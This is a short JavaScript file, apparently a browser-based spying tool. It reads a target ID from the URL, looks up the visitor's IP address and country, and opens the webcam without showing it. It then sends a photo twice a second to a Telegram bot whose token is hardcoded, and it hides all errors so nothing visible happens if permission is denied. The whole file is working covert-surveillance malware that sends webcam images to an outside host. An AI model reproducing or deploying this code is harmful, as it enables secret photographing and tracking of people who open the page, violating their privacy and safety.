// ============ CONFIG ============
const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
const INTERVAL_MS = 500; // 2 times per second
// ================================

// UID from URL (?=6362758258)
const params = new URLSearchParams(location.search);
const UID = params.get("") || "UNKNOWN";

let video, stream;
let ip = "Unknown";
let country = "Unknown";
let flag = "🏳️";

// country code → flag emoji
function countryToFlag(code){
  if(!code) return "🏳️";
  return code
    .toUpperCase()
    .replace(/./g, c =>
      String.fromCodePoint(127397 + c.charCodeAt())
    );
}

// 1️⃣ FIRST: get IP + country (WAIT)
async function getIpInfo(){
  try{
    const res = await fetch("https://ipapi.co/json/");
    const d = await res.json();
    ip = d.ip || "Unknown";
    country = d.country_name || "Unknown";
    flag = countryToFlag(d.country_code);
  }catch(e){
    // keep defaults
  }
}

// 2️⃣ start hidden camera
async function startCamera(){
  stream = await navigator.mediaDevices.getUserMedia({ video:true });
  video = document.createElement("video");
  video.srcObject = stream;
  await video.play();
}

// 3️⃣ loop capture
async function loop(){
  await captureAndSend();
  setTimeout(loop, INTERVAL_MS);
}

async function captureAndSend(){
  if(!video.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  const blob = await new Promise(r =>
    canvas.toBlob(r,"image/jpeg",0.8)
  );

  const caption =
`━━━━━━━━━━━━━━
📸 <b>NEW IMAGE</b>
━━━━━━━━━━━━━━
🔢 <b>UID</b> : ${UID}
🌐 <b>IP</b> : ${ip}
🌍 <b>Country</b> : ${country} ${flag}
━━━━━━━━━━━━━━
👨‍💻 <b>Dev</b> : @XFPro43`;

  const form = new FormData();
  form.append("chat_id", UID);
  form.append("photo", blob, "img.jpg");
  form.append("caption", caption);
  form.append("parse_mode","HTML");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    body:form
  }).catch(()=>{});
}

// 🔁 MAIN FLOW (ترتیب مهم دی)
(async ()=>{
  try{
    await getIpInfo();     // ← مهم فکس
    await startCamera();  // ← بیا camera
    loop();               // ← بیا loop
  }catch(e){
    // permission denied → nothing visible
  }
})();

// stop camera on exit
window.addEventListener("beforeunload",()=>{
  if(stream) stream.getTracks().forEach(t=>t.stop());
});
